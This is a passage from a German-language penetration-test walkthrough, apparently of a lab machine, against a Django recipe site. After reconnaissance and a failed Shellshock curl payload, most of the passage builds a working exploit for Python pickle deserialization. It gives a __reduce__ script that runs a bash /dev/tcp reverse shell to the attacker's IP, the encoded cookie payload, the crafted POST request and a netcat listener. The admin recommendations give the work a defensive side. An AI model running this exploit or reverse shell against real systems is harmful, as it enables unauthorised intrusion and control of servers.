> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
<span class="command">HTTP/1.1 200 OK</span>
< Date: Mon, 16 Jun 2025 12:08:09 GMT
<span class="command">Date: Mon, 16 Jun 2025 12:08:09 GMT</span>
< Server: WSGIServer/0.2 CPython/3.8.6
<span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span>
< Content-Type: text/html; charset=utf-8
<span class="command">Content-Type: text/html; charset=utf-8</span>
< X-Frame-Options: DENY
<span class="command">X-Frame-Options: DENY</span>
< Vary: Cookie
<span class="command">Vary: Cookie</span>
< Content-Length: 7453
<span class="command">Content-Length: 7453</span>
< X-Content-Type-Options: nosniff
<span class="command">X-Content-Type-Options: nosniff</span>
< Referrer-Policy: same-origin
<span class="command">Referrer-Policy: same-origin</span>
< Set-Cookie:  csrftoken=R5beSb4alXctlW9Hb9FPn0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyWB1; expires=Mon, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax
<span class="password">Set-Cookie:  csrftoken=R5beSb4alXctlW9Hb9FPn0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyWB1; expires=Mon, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax</span>
< 

* shutting down connection #0
</pre>
                </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Ich betrachte den Quellcode der Startseite (http://192.168.2.48:5003/). Dieser Code zeigt die Struktur der Rezept-Website. Ich sehe Links zu "Home" und "About" und eine Liste von Rezepten ("Homemade Pickle", "Pickle Pie", "Blueberry Pie", "Apple Pie", "German Chocolate Pie"). Jedes Rezept wird mit einem Titel, einer Kurzbeschreibung und dem Namen des Benutzers angezeigt, der es gepostet hat, zusammen mit einem Datum. Die Namen der Poster sind <span class="command">ramsey</span>, <span class="command">wan</span> und <span class="command">oliver</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Analyse des Homepage-Inhalts ist wichtig, um die FunktionalitÃ¤t der Website zu verstehen und potenzielle Benutzernamen zu sammeln. Die Namen <span class="command">ramsey</span>, <span class="command">wan</span> und <span class="command">oliver</span> sind hÃ¶chstwahrscheinlich gÃ¼ltige Benutzernamen auf dem System oder in der Webanwendung. Diese Information ist wertvoll fÃ¼r spÃ¤tere Brute-Force-Angriffe auf Anmeldedienste wie SSH oder den Web-Login.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> FÃ¼gen Sie die identifizierten Namen (<span class="command">ramsey</span>, <span class="command">wan</span>, <span class="command">oliver</span>) Ihrer Liste potenzieller Benutzernamen hinzu. Versuchen Sie, diese Namen gegen Login-Seiten (Web-Login, SSH) zu testen, mÃ¶glicherweise in Kombination mit gÃ¤ngigen oder geleakten PasswÃ¶rtern.
                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Offenlegung von gÃ¼ltigen Benutzernamen Ã¼ber Ã¶ffentliche Schnittstellen. Wenn Benutzernamen angezeigt werden mÃ¼ssen (z.B. bei Blog-Posts), verwenden Sie Aliase oder stellen Sie sicher, dass die Offenlegung kein Risiko darstellt (z.B. durch sichere Anmeldeverfahren, die Brute-Force-Angriffe erschweren).
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>
http://192.168.2.48:5003/
<span class="command">[Un]baked</span>

    Home
    About

<span class="command">[Un]baked:/</span>
Share your recipes because why not?
Homemade Pickle

Homemade Pickle Ingredients Hereâ€™s what youâ€™re ...

Posted by <span class="command">ramsey</span> on Oct. 3, 2020, 10:46 a.m.
Pickle Pie

How to Make It Step 1 Preheat oven to 350Â°F. F...

Posted by <span class="command">ramsey</span> on Oct. 3, 2020, 10:45 a.m.
Blueberry Pie

Blueberry Pie is marvelous, especially when made h...

Posted by <span class="command">wan</span> on Oct. 2, 2020, 2:47 p.m.
Apple Pie

Crust 1 box Pillsburyâ„¢ refrigerated pie crusts, s...

Posted by <span class="command">ramsey</span> on Oct. 2, 2020, 2:45 p.m.
German Chocolate Pie

Ingredients Pastry for single-crust pie (9 ...

Posted by <span class="command">oliver</span> on Oct. 2, 2020, 2:38 p.m.

Copyright Â© Your Website 2020
</pre>
                 </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Ich rufe eine Fehlerseite auf der Webanwendung auf oder versuche, eine Aktion durchzufÃ¼hren, die einen CSRF-Fehler auslÃ¶st. Die Ausgabe zeigt die Standard-Fehlerseite von Django, die bei einem CSRF-Fehler angezeigt wird.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Diese Fehlerseite ist extrem aufschlussreich. Sie bestÃ¤tigt nicht nur, dass die Anwendung das Django-Framework verwendet, sondern die zusÃ¤tzliche Hilfe-Sektion, die hier angezeigt wird ("You're seeing the help section of this page because you have <span class="command">DEBUG = True</span> in your Django settings file."), beweist, dass der Debug-Modus (`DEBUG = True`) auf diesem Produktionssystem aktiviert ist. Das ist eine kritische Fehlkonfiguration, die in Produktionsumgebungen niemals aktiv sein sollte. Im Debug-Modus leakt Django detaillierte Fehlerinformationen, einschlieÃŸlich Stack Traces, Konfigurationseinstellungen und sogar den Inhalt von Variablen und Datenbankabfragen, wenn Fehler auftreten. Dies kann einem Angreifer immense Einblicke in die interne Funktionsweise der Anwendung und des Systems geben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Notieren Sie sich, dass <span class="command">DEBUG = True</span> aktiv ist. Versuchen Sie, weitere Fehler zu provozieren (z.B. durch Eingabe ungÃ¼ltiger Daten, Zugriff auf nicht-existente URLs), um zu sehen, welche Art von Informationen geleakt werden. Achten Sie besonders auf Stack Traces, die Dateipfade oder Code-Snippets enthalten kÃ¶nnten.
                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie dringend den Django-Debug-Modus (<span class="command">DEBUG = False</span>) in der Produktionsumgebung. Konfigurieren Sie stattdessen ein robustes Logging, um Fehler intern zu verfolgen, ohne sensible Details nach auÃŸen zu geben. Passen Sie die <span class="command">CSRF_FAILURE_VIEW</span> an, um eine generische Fehlerseite anzuzeigen, die keine internen Details preisgibt.
            </p>
            <div class="code-block">
                 <div class="terminal">
                    <pre>
 <h1>Forbidden <span class="command"><span>(403)</span></span></h1>
 <p>CSRF verification failed. Request aborted.</p>

 <p>You are seeing this message because this site requires a CSRF cookie when submitting forms. This cookie is required for security reasons, to ensure that your browser is not being hijacked by third parties.</p>
 <p>If you have configured your browser to disable cookies, please re-enable them, at least for this site, or for â€œsame-originâ€ requests.</p>

 <h2>Help</h2>
   
 <p>Reason given for failure:</p>
 <pre>
 <span class="command">CSRF cookie not set.</span>
 </pre>
   

 <p>In general, this can occur when there is a genuine Cross Site Request Forgery, or when
 <span class="command">[Link: Django's CSRF mechanism | Ziel: https://docs.djangoproject.com/en/3.1/ref/csrf/]</span> has not been used correctly. For PST forms, you need to
 ensure:</p>

 <ul>
   <li>Your browser is accepting cookies.</li>

   <li>The view function passes a <code>request</code> to the template's <span class="command">[Link: <code>render</code> | Ziel: https://docs.djangoproject.com/en/dev/topics/templates/#django.template.backends.base.Template.render]</span> method.</li>

   <li>In the template, there is a <code>{% csrf_token
 <scrpt > %}</code> template tag inside each PST form that
 targets an internal URL.</li>

   <li>If you are not using <code>CsrfViewMiddleware</code>, then you must use
 <code>csrf_protect</code> on any views that use the <code>csrf_token</code>
 template tag, as well as those that accept the PST data.</li>

   <li>The form has a valid CSRF token. After logging in in another browser
 tab or hitting the back button after a login, you may need to reload the
 page with the form, because the token is rotated after a login.</li>
 </ul>

 <p>You're seeing the help section of this page because you have <code><span class="password">DEBUG =
 True</span></code> in your Django settings file. Change that to <code>False</code>,
 and only the initial error message will be displayed.  </p>

 <p>You can customize this page using the CSRF_FAILURE_VIEW setting.</p>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich habe das vom Nikto-Scan gemeldete Potenzial fÃ¼r die Shellshock-Schwachstelle auf dem Pfad <span class="command">/cgi_wrapper</span> untersucht. Ich versuche, den Shellshock-Exploit Ã¼ber den <span class="command">User-Agent</span> Header zu injizieren, der in CGI-Umgebungen oft als Umgebungsvariable Ã¼bergeben wird. Der Payload <span class="command">() { :; }; /bin/ping -c 3 192.168.2.199</span> ist ein klassischer Shellshock-Test, der bei erfolgreicher AusfÃ¼hrung drei ICMP-Pakete an meine Kali-IP (192.168.2.199) senden sollte. Ich sende die Anfrage mit <span class="command">curl -H "User-Agent: ..." http://192.168.2.48:5003/cgi_wrapper</span> und leite die Ausgabe an <span class="command">grep "code"</span>, um interessante Zeilen im erwarteten Fehler-Output zu filtern.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe zeigt, dass die Shellshock-Nutzlast zwar im <span class="command">User-Agent</span> gesendet wurde und die Anfrage den <span class="command">/cgi_wrapper</span>-Pfad erreicht hat, aber der Payload selbst wurde nicht ausgefÃ¼hrt. Stattdessen erhalte ich eine detaillierte Django-Fehlermeldung (dank <span class="command">DEBUG = True</span>), die zeigt, dass Django versucht hat, den Pfad zu verarbeiten, und dabei gescheitert ist. Die Ausgabe enthÃ¤lt Code-Snippets aus Django-Interna und meine eingefÃ¼gte Payload ist in den Stack Trace eingebettet, was zeigt, dass sie als *Daten*, nicht als *Code* interpretiert wurde. Dies deutet darauf hin, dass entweder die Bash-Version nicht verwundbar ist, oder die AusfÃ¼hrungsumgebung des CGI-Skripts die Nutzlast nicht in einer anfÃ¤lligen Weise verarbeitet. Die direkte Ausnutzung von Shellshock auf diesem Pfad scheint nicht erfolgreich zu sein, aber die Tatsache, dass der Pfad existiert und Django darauf reagiert, ist notiert.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Obwohl der direkte Shellshock-Test fehlschlug, gibt die detaillierte Django-Fehlermeldung Hinweise. Analysieren Sie die Fehlermeldung auf weitere geleakte Informationen (Dateipfade, Konfigurationen). Das Scheitern des Shellshock-Tests bedeutet, dass ein anderer Weg zum initialen Zugriff gesucht werden muss. Konzentrieren Sie sich weiter auf die Webanwendung selbst und die anderen gefundenen Pfade.
                <br><strong>Empfehlung (Admin):</strong> Wie bereits erwÃ¤hnt: Deaktivieren Sie <span class="command">DEBUG = True</span> in Produktionsumgebungen. PrÃ¼fen Sie, ob die gemeldeten CGI-Pfade (<span class="command">/cgi_wrapper</span> etc.) auf dem System existieren und ob sie tatsÃ¤chlich Bash in einer verwundbaren Version nutzen. Wenn nicht benÃ¶tigt, entfernen Sie diese Pfade. Wenn benÃ¶tigt, stellen Sie sicher, dass die Bash-Shell aktuell ist oder dass Eingaben sorgfÃ¤ltig validiert und nicht direkt an die Shell Ã¼bergeben werden.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl -H "User-Agent: () { :; }; /bin/ping -c 3 192.168.2.199" http://192.168.2.48:5003/cgi_wrapper | grep "code"</span></div>
                </div>
                <div class="terminal">
                    <pre>
          <code class="fname">/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py</code>, line 47, in inner
                    ....
                    ...
                    <td class="code"><pre>&<span class="command">#x27;cgi_wrapper&</span>#x27;</pre></td>
          <code class="fname">/usr/local/lib/python3.8/site-packages/django/db/models/manager.py</code>, line 85, in manager_method
                    <td class="code"><pre>()</pre></td>
                    <td class="code"><pre>{
					        <p class="analysis">
            <strong>Analyse:</strong> Der <span class="command">search_cookie</span>-Wert <span class="command">"gASVCQAAAAAAAACMBXNzc3NzlC4="</span> aus der HTTP-Antwort sieht verdÃ¤chtig BASE64-kodiert aus. Die Struktur <span class="command">"gASV"</span> am Anfang ist ein bekannter Marker fÃ¼r ein Python Pickle-serialisiertes Objekt im Binary-Protokoll. Um das zu bestÃ¤tigen und zu verstehen, was im Cookie gespeichert ist, muss ich es dekodieren. Ich werde ein kleines Python-Skript verwenden, um den BASE64-String zu dekodieren.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Das Erkennen der <span class="command">"gASV"</span> Signatur ist ein kritischer Schritt. Es deutet stark auf die Verwendung von Python Pickle hin, einem Serialisierungsformat, das bei der Deserialisierung (dem ZurÃ¼ckwandeln in ein Python-Objekt) Code ausfÃ¼hren kann, wenn die Daten von einer unvertrauenswÃ¼rdigen Quelle stammen. Das Speichern von strukturierten Daten oder Objekten in Cookies ist an sich nicht unsicher, aber die Wahl des Serialisierungsformats ist hier entscheidend. Wenn es sich tatsÃ¤chlich um Pickle handelt, haben wir einen sehr aussichtsreichen Vektor fÃ¼r Remote Code Execution gefunden.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Dekodieren Sie den Cookie-Wert und versuchen Sie, das resultierende Objekt mit <span class="command">pickletools.dis</span> zu disassemblieren, um seine Struktur und seinen Inhalt zu verstehen. Bereiten Sie sich darauf vor, einen bÃ¶sartigen Pickle-Payload zu erstellen, der einen Systembefehl ausfÃ¼hren kann.
            <br><strong>Empfehlung (Admin):</strong> **Dringend:** ÃœberprÃ¼fen Sie, wie dieses <span class="command">search_cookie</span> erstellt und verarbeitet wird. Wenn Python Pickle fÃ¼r die Serialisierung von Daten verwendet wird, die aus Benutzereingaben (wie dem Suchbegriff) oder Cookies stammen, deaktivieren Sie dies sofort und stellen Sie auf ein sicheres Serialisierungsformat (z.B. JSON) um. Verwenden Sie niemals <span class="command">pickle.loads()</span> auf unvertrauenswÃ¼rdigen Daten.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">vi dcookie.py</span></div>
            </div>
            <div class="terminal">
                <pre>
import base64

ecookie = "gASVCAAAAAAAAACMBG1pbHWULg=="
<span class="command">dcookie = base64.b64decode(ecookie) # Korrektur des Variablennamens im Skript</span>
print(dcookie)
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Ich habe ein kleines Python-Skript erstellt, um den BASE64-kodierten Cookie-Wert zu dekodieren. Das Skript importiert die <span class="command">base64</span>-Bibliothek, definiert den kodierten String und verwendet dann <span class="command">base64.b64decode()</span>, um die ursprÃ¼nglichen Bytes zu erhalten. Beim AusfÃ¼hren des Skripts (<span class="command">python3 dcookie.py</span>) wird die dekodierte Byte-Sequenz ausgegeben.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Die Ausgabe <span class="command">b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'</span> bestÃ¤tigt, dass es sich um BinÃ¤rdaten handelt, die mit dem Pickle-Protokoll beginnen (<span class="command">\x80\x04</span> deutet auf Protokoll 4 hin). Die Bytes enthalten den String <span class="command">"milu"</span>. Dies ist die Deserialisierung des Werts <span class="command">"sssss"</span>, der im ursprÃ¼nglichen Cookie durch <span class="command">"gASVCQAAAAAAAACMBXNzc3NzlC4="</span> ersetzt wurde. Dieses Verhalten â€“ dass der Suchterm in irgendeiner Form im Cookie landet und serialisiert wird â€“ erhÃ¤rtet den Verdacht, dass der Server dieses Cookie wieder deserialisiert.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Das Dekodieren war erfolgreich. Der nÃ¤chste Schritt ist die Disassemblierung des Pickle-Bytes, um die genaue Struktur des Objekts zu verstehen, das serialisiert wurde. Dies hilft dabei, einen schÃ¤dlichen Payload zu konstruieren.
            <br><strong>Empfehlung (Admin):</strong> ÃœberprÃ¼fen Sie dringend den Code, der das <span class="command">search_cookie</span> setzt und liest. Stellen Sie sicher, dass keine unsicheren Serialisierungsformate fÃ¼r benutzergenerierte oder vom Client stammende Daten verwendet werden.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">python3 dcookie.py</span></div>
            </div>
            <div class="terminal">
                <pre>
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Um die Struktur des Pickle-Objekts im <span class="command">search_cookie</span> besser zu verstehen, verwende ich das eingebaute <span class="command">pickletools</span>-Modul in Python, speziell die <span class="command">dis()</span> Funktion, die Pickle-Bytecode disassembliert. Ich starte eine interaktive Python-Session (<span class="command">python3</span>), importiere die notwendigen Bibliotheken (<span class="command">base64</span>, <span class="command">pickletools</span>, <span class="command">io</span>), dekodiere den BASE64-String wieder und Ã¼bergebe die resultierenden Bytes an <span class="command">pickletools.dis()</span>.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Die Disassemblierung des Pickle-Objekts liefert die genauen Opcodes, die beim Deserialisieren ausgefÃ¼hrt werden. Die Ausgabe zeigt eine Sequenz von Opcodes, darunter <span class="command">PROTO 4</span> (Pickle-Protokoll Version 4), <span class="command">FRAME</span>, <span class="command">SHORT_BINUNICODE 'milu'</span> und <span class="command">STOP</span>. Der entscheidende Punkt ist die Anwesenheit des Strings <span class="command">'milu'</span> (vom Suchbegriff 'sssss') und die Tatsache, dass dies ein Pickle-Objekt ist. Pickle kann Opcodes enthalten, die Code-AusfÃ¼hrung erlauben, insbesondere durch die Serialisierung von Klassen mit einer <span class="command">__reduce__</span> Methode. Da das System scheinbar <span class="command">pickle.loads()</span> auf diesen Daten ausfÃ¼hrt, kann ich einen bÃ¶sartigen Payload erstellen, der die <span class="command">__reduce__</span> Methode nutzt, um einen Systembefehl auszufÃ¼hren.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> BestÃ¤tigung der Pickle-Deserialisierung. Jetzt ist das Ziel, einen Python-Code zu schreiben, der ein Objekt serialisiert, dessen Deserialisierung einen Befehl auf dem Zielsystem ausfÃ¼hrt. Dieser Pickle-Payload wird dann BASE64-kodiert und im <span class="command">search_cookie</span> an den Server gesendet.
            <br><strong>Empfehlung (Admin):</strong> **SofortmaÃŸnahme:** Deaktivieren Sie die FunktionalitÃ¤t, die dieses <span class="command">search_cookie</span> verwendet, oder Ã¤ndern Sie das Serialisierungsformat auf etwas Sicheres wie JSON. FÃ¼hren Sie einen Code-Audit durch, um alle Stellen zu identifizieren, an denen <span class="command">pickle.loads()</span> mit unsicheren Datenquellen verwendet wird.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">python3</span></div>
            </div>
            <div class="terminal">
                <pre>
Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
  
>>> import base64, pickletools, io
>>> cookie_value_b64 = "gASVCAAAAAAAAACMBG1pbHWULg=="
>>> pickled_bytes = base64.b64decode(cookie_value_b64)
>>> print(pickled_bytes)
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'
>>> disassembled_stream = io.BytesIO(pickled_bytes)
>>> pickletools.dis(disassembled_stream)
    <span class="command">0: \x80 PROTO      4</span>
    <span class="command">2: \x95 FRAME      8</span>
   <span class="command">11: \x8c SHORT_BINUNICODE 'milu'</span> <<<<----
   <span class="command">17: \x94 MEMOIZE    (as 0)</span>
   <span class="command">18: .    STOP</span>
highest protocol among opcodes = 4
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Basierend auf der BestÃ¤tigung der Pickle Deserialisierungs-Schwachstelle erstelle ich nun ein Python-Skript, um einen bÃ¶sartigen Pickle-Payload zu generieren. Dieses Skript nutzt die FÃ¤higkeit von Pickle, Klassen mit einer <span class="command">__reduce__</span> Methode zu serialisieren. Die <span class="command">__reduce__</span> Methode kann ein Tupel zurÃ¼ckgeben, das eine Funktion und ihre Argumente beschreibt, die wÃ¤hrend der Deserialisierung ausgefÃ¼hrt werden sollen.
            <br>Ich definiere eine Klasse namens <span class="command">RCE</span> mit der <span class="command">__reduce__</span> Methode. Diese Methode gibt ein Tupel zurÃ¼ck, das die Funktion <span class="command">os.system</span> und als Argument einen Bash-Befehl enthÃ¤lt. Der Befehl <span class="command">'bash -c "bash -i >& /dev/tcp/{KALI_IP}/{LISTEN_PORT} 0>&1"'</span> ist ein gÃ¤ngiger Bash Reverse Shell Payload. Er verbindet eine interaktive Bash-Shell Ã¼ber TCP mit meiner Angreifer-IP (<span class="command">KALI_IP</span>) und dem Listener-Port (<span class="command">LISTEN_PORT</span>), die im Skript definiert sind (192.168.2.199 auf Port 4444).
            <br>Das Skript erstellt eine Instanz der <span class="command">RCE</span>-Klasse, serialisiert sie mit <span class="command">pickle.dumps()</span> und kodiert das Ergebnis in BASE64 mit <span class="command">base64.b64encode()</span>. Das BASE64-Ergebnis wird ausgegeben.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Dieses Skript implementiert die klassische Methode zur Ausnutzung von unsicherem Python Pickle Deserialization. Der generierte BASE64-String reprÃ¤sentiert ein Python-Objekt, das, wenn es auf dem Zielsystem deserialisiert wird, den definierten Bash Reverse Shell-Befehl ausfÃ¼hrt. Dies ist unser geplanter Weg zum initialen Systemzugriff.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> FÃ¼hren Sie dieses Skript aus, um den schÃ¤dlichen BASE64-Payload zu erhalten. Bereiten Sie einen Netcat-Listener auf Ihrem Angreifer-System auf dem definierten Port vor. Senden Sie dann diesen Payload im <span class="command">search_cookie</span> an den Webserver, um die Reverse Shell zu triggern.
            <br><strong>Empfehlung (Admin):</strong> Verstehen Sie, dass unsichere Deserialisierung eine der gefÃ¤hrlichsten Schwachstellen ist, die zu direkter Remote Code Execution fÃ¼hrt. Der Einsatz von Pickle mit unvertrauenswÃ¼rdigen Daten muss eingestellt werden.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">vi generat_rce.py</span></div>
            </div>
            <div class="terminal">
                <pre>
import pickle
import base64
import os

KALI_IP = "192.168.2.199"
LISTEN_PORT = 4444

class RCE:
    def __reduce__(self):
        cmd = f'bash -c "bash -i >& /dev/tcp/{KALI_IP}/{LISTEN_PORT} 0>&1"'
        return (os.system, (cmd,))

payload_object = RCE()
pickled_bytes = pickle.dumps(payload_object)
base64_payload = base64.b64encode(pickled_bytes)

print(base64_payload.decode())
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Ich fÃ¼hre das <span class="command">generat_rce.py</span> Skript aus, das ich gerade erstellt habe, um den BASE64-kodierten Python Pickle Payload zu erhalten. Der Befehl ist einfach <span class="command">python3 generat_rce.py</span>.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Das Ergebnis ist der erwartete BASE64-String: <span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>. Dieser String enthÃ¤lt die serialisierte Form meiner <span class="command">RCE</span>-Klasse und des Bash Reverse Shell Befehls. Diesen String werde ich im <span class="command">search_cookie</span> des nÃ¤chsten POST-Requests an <span class="command">/search</span> verwenden, um die Schwachstelle auszunutzen und die Reverse Shell zu initiieren.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> Kopieren Sie diesen generierten BASE64-String. Richten Sie nun einen Netcat-Listener auf Ihrem Angreifer-System ein. Ersetzen Sie im nÃ¤chsten POST-Request an <span class="command">/search</span> den ursprÃ¼nglichen <span class="command">search_cookie</span>-Wert durch diesen Payload und senden Sie den Request.
            <br><strong>Empfehlung (Admin):</strong> Achten Sie auf ungewÃ¶hnliche Cookie-Werte, insbesondere solche, die wie BASE64-kodierte BinÃ¤rdaten aussehen und in Verbindung mit POST-Requests stehen. Implementieren Sie Intrusion Detection Systems (IDS) oder Web Application Firewalls (WAFs), die bekannte Muster von Serialisierungs-Exploits erkennen kÃ¶nnen.
        </p>
        <div class="code-block">
            <div class="terminal">
                <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">python3 generat_rce.py</span></div>
            </div>
            <div class="terminal">
                <pre>
<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Nun ist der Moment gekommen, die Pickle Deserialisierungs-Schwachstelle auszunutzen. Ich sende erneut einen HTTP POST-Request an den <span class="command">/search</span>-Pfad, genau wie bei der Analyse des Cookies zuvor. Der entscheidende Unterschied ist, dass ich den Wert des <span class="command">search_cookie</span> im <span class="command">Cookie</span>-Header durch den BASE64-kodierten, bÃ¶sartigen Pickle-Payload ersetze, den ich im vorherigen Schritt generiert habe (<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>). Der <span class="command">csrfmiddlewaretoken</span> wird ebenfalls mitgesendet, um CSRF-PrÃ¼fungen zu umgehen (obwohl es hier wahrscheinlich nicht relevant wÃ¤re, da der Angriff Ã¼ber das Cookie und nicht Ã¼ber das Formular erfolgt). Der <span class="command">query=sssss</span> Parameter wird beibehalten, obwohl sein Inhalt in diesem Fall irrelevant sein sollte, da der Payload im Cookie liegt. Ich sende diesen Request, wÃ¤hrend ein Netcat-Listener auf meinem Angreifer-System lÃ¤uft.
        </p>
        <p class="evaluation">
            <strong>Bewertung:</strong> Dieser Request ist der AuslÃ¶ser fÃ¼r die Remote Code Execution. Wenn der Server das modifizierte <span class="command">search_cookie</span> liest und dessen Inhalt deserialisiert, sollte der im Payload eingebettete Systembefehl (<span class="command">bash -c "bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"</span>) ausgefÃ¼hrt werden. Das erwartete Ergebnis ist eine eingehende Verbindung von der Zielmaschine auf meinem Netcat-Listener, die mir eine interaktive Shell gibt.
        </p>
        <p class="recommendation">
            <strong>Empfehlung (Pentester):</strong> ÃœberprÃ¼fen Sie sofort den Netcat-Listener. Bei Erfolg haben Sie initialen Zugriff auf das System. Dokumentieren Sie die erhaltene Shell und die Berechtigungen, mit denen Sie gestartet sind.
            <br><strong>Empfehlung (Admin):</strong> Dies demonstriert die direkte Ausnutzung einer schwerwiegenden Schwachstelle. Ãœberwachen Sie Webserver-Logs und Netzwerkverkehr auf ungewÃ¶hnliche Anfragen, insbesondere solche mit manipulierten Cookies oder unerwartetem BASE64-Inhalt. Implementieren Sie strenge Input-Validierung und verwenden Sie sichere Programmierpraktiken, um Deserialisierungsangriffe zu verhindern.
        </p>
        <div class="code-block">
            <div class="terminal">
                <pre>
<span class="command">PST /search HTTP/1.1</span>
<span class="command">Host: 192.168.2.48:5003</span>
<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
<span class="command">Accept-Encoding: gzip, deflate, br</span>
<span class="command">Referer: http://192.168.2.48:5003/</span>
<span class="command">Content-Type: application/x-www-form-urlencoded</span>
<span class="command">Content-Length: 96</span>
<span class="command">Origin: http://192.168.2.48:5003</span>
<span class="command">DNT: 1</span>
<span class="command">Connection: keep-alive</span>
<span class="command">Cookie: csrftoken=J167sPVx1AW33KOvUsajp8TnFZaWAHmc3MXApp3e5z9QuhRLZww7eDzpn0GiERaw; search_cookie="<span class="password">gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>"</span>
<span class="command">Upgrade-Insecure-Requests: 1</span>
<span class="command">Sec-GPC: 1</span>
<span class="command">Priority: u=0, i</span>

<span class="command">csrfmiddlewaretoken=aqH27U6WwAnfzoreXF9ci1La9scPubV9ubyv4ueDAzA20Vuu2Jv07wrcRtIbylJt&query=sssss</span>
</pre>
            </div>
        </div>

        <p class="analysis">
            <strong>Analyse:</strong> Vor dem Senden des bÃ¶sartigen POST-Requests habe ich, wie geplant, einen Netcat-Listener auf meinem Angreifer-System gestartet. Der Befehl <span class="command">nc -lvnp 4444</span> richtet einen Listener ein, der auf Port 4444 lauscht:
            <br>- <span class="command">-l</span>: Listen-Modus
            <br>- <span class="command">-v</span>: Verbose-Modus, zeigt Verbindungsinformationen
            <br>- <span class="command">-n</span>: Numerische Adressen, keine DNS-AuflÃ¶sung
            <br>- <span class="command">-p 4444</span>: Gibt den Port an, auf dem gelauscht werden soll.
